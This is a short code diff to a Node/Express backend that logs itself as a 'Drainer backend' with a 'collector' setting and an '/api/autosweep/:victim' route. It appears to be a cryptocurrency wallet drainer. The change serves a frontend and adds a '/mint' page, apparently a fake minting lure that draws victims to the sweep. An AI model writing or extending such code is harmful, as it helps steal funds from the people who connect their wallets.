@@ -68,9 +68,12 @@ app.post('/api/autosweep/:victim', async (req,res)=>{
   }catch(e){ res.status(500).json({error:e.message}); }
 });
 
+// Frontend statisch mitservieren — kein Netlify nötig
+app.use(express.static(path.join(__dirname, '..', 'frontend')));
+
 // Admin-Panel
 app.get('/admin', (req,res)=> res.sendFile(path.join(__dirname, 'admin.html')));
-app.get('/', (req,res)=> res.redirect('/admin'));
+app.get('/mint', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'index.html')));
 
 const PORT = cfg.port || 3001;
 app.listen(PORT, ()=> console.log(`Drainer backend on :${PORT}, collector=${cfg.collector}`));
